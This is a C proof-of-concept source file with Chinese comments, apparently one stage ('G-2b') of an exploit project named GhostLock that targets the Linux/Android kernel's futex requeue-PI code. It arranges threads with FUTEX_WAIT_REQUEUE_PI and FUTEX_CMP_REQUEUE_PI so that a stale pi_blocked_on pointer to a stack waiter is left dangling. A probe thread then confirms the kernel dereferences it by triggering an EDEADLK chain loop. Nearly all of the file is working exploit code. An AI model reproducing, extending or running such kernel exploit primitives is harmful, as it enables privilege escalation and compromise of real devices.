/*
 * g2b_deref.c — GhostLock G-2b：用"能成环"的探针判定悬垂 pi_blocked_on
 *
 * 上一版（g2_deref）的缺陷：
 *   remove_waiter() 已把 W 的 waiter 从 C 的等待队列摘掉，C 变空；
 *   探针 X 即使正确解引用了 W->pi_blocked_on（lock=C），走到 C 后也无 waiter
 *   可判死锁，链走查直接终止 → 表现为 ETIMEDOUT，无法区分"解引用"与"未解引用"。
 *
 * 本版探针（Y: LOCK_PI(C)，500ms 超时）：
 *   Y 在 C 上入队成功后，若 owner(O)->pi_blocked_on 有效、且 W->pi_blocked_on 悬垂，
 *   链走查路径为：
 *       C(orig_lock, owner=O) → O 阻塞于 B → B(owner=W) → W 的 pi_blocked_on → C
 *   回到 orig_lock → 命中 rtmutex.c:644 → 返回 -EDEADLK。
 *
 *   判据：
 *     EDEADLK(35)   → 悬垂指针被解引用（关键结论）
 *     ETIMEDOUT(110)→ 链未回到 C，说明 W->pi_blocked_on 已被清空
 *
 *   对照：无任何损坏时，Y 只是普通阻塞（C 由 O 持有，O 阻塞于 B，W 阻塞于普通
 *   futex，PI 链不成环）→ 必然 ETIMEDOUT。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define LOGPATH "/data/local/tmp/g2b.log"

#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A, C, B;
	volatile int b_held, c_held, o_blocked, w_waiting;
	volatile int go_probe, y_done;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	setpriority(PRIO_PROCESS, 0, 19);
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

/* 探针：对 C 做 LOCK_PI，带 500ms 超时 */
static void *thread_y(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	while (!S->go_probe)
		__asm__ __volatile__("" ::: "memory");

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_nsec += 500L * 1000 * 1000;
	if (ts.tv_nsec >= 1000000000L) {
		ts.tv_sec += 1;
		ts.tv_nsec -= 1000000000L;
	}
	lg("Y: 进入 LOCK_PI(C)（500ms 超时）");
	errno = 0;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	lg("Y: LOCK_PI(C) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && errno == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 被解引用（PI 链经 W 的栈上 waiter 成环）");
	else if (r == -1 && errno == ETIMEDOUT)
		lg("verdict: 未成环 → W->pi_blocked_on 应为 NULL（悬垂已被清除）");
	else if (r == 0)
		lg("verdict: 意外取得 C");
	else
		lg("verdict: 其他 errno=%d (%s)", errno, strerror(errno));
	S->y_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(void)
{
	pthread_t tw, to, ty;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2b start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->B = S->C = 0;

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("R: CMP_REQUEUE_PI(A→C, 1)");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	if (!(r == -1 && e == EDEADLK)) {
		lg("前置未达成，终止");
		sync_log();
		_exit(2);
	}
	lg("前置达成：W 仍阻塞于 A，其 pi_blocked_on 应悬垂指向 C 的旧 waiter");
	sync_log();

	pthread_create(&ty, NULL, thread_y, NULL);
	S->go_probe = 1;
	__sync_synchronize();

	{
		int spin = 0;
		while (!S->y_done && spin < 3000) {
			usleep(1000);
			spin++;
		}
		if (!S->y_done)
			lg("探针未在 3s 内返回");
	}
	lg("结束（不做清理性 PI 操作）");
	sync_log();
	_exit(0);
}
